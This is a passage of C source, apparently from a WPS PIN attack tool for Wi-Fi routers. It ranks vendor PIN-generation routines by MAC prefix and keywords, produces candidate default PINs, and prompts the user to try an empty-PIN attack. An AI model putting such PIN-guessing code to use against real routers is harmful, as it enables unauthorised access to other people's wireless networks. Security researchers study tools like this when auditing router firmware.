			for(max=i=0; i<*len; ++i) {
				func[i].priority = mac_pin_find_oui(func[i].oui, mac) + mac_pin_find_kword(haystack, func[i].vendor) + mac_pin_find_kword(haystack, func[i].model) + mac_pin_find_kword(haystack, func[i].key);
				if (func[i].priority > max) {
					max = func[i].priority;
				}
			}
			/* generate the default pins according to your priority */
			index = 0;
			do {
				for(i=0; i<*len; ++i) {
					if (func[i].priority == max) {
						if (func[i].add >= 0 && !func[i].serial) {
							pins[index] = func[i].pin(mac, func[i].add);
						} else if (func[i].add < 0 && !func[i].serial) {
							pins[index] = func[i].pin(mac);
						} else if (func[i].add < 0 && func[i].serial) {
							pins[index] = func[i].pin(mac, serial);
						} else {
							pins[index] = func[i].pin(mac, func[i].add);
						}
						/* Empty pin is possible, so print alert */
						if (pins[index] < 0 && func[i].priority > 0) {
							cprintf(INFO, "[+] Empty pin is possible, try attack with <empty> pin: -p \"\"\n");
							sleep(3);
						}
						++index;
					}
				}
				--max;
			} while(max>=0);
		}
		if(mac) free(mac);
		if(haystack) free(haystack);
		if(serial) free(serial);
	}
	else {
		*len = 0;
	}

	return pins;
}

